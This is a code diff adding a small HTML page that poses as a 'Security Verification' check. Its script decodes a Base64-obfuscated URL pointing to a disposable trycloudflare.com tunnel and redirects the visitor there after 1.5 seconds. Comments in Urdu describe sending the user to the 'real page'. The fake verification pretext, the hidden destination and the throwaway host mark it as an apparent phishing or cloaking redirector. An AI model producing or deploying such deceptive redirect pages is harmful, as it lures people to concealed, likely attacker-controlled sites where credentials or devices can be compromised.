@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Check | Loading...</title>
+</head>
+<body style="text-align:center; padding-top:100px; font-family:sans-serif; background-color:#f4f4f4;">
+    <div style="background:white; display:inline-block; padding:40px; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,0.1);">
+        <h2>Security Verification</h2>
+        <p>Please wait while we verify your secure connection...</p>
+    </div>
+
+    <script>
+        /* آپ کا نیا Base64 کوڈ جو تصویر سے لیا گیا ہے */
+        var secureLink = "aHR0cHM6Ly9jb25jZXB0dWFsLXJlbWFpbi1mZGEtbGVhcm5pbmcudHJ5Y2xvdWRmbGFyZS5jb20=";
+
+        /* یہ فنکشن 1.5 سیکنڈ کے بعد آپ کو اصلی پیج پر بھیج دے گا */
+        setTimeout(function() {
+            window.location.href = atob(secureLink);
+        }, 1500);
+    </script>
+</body>
+</html>
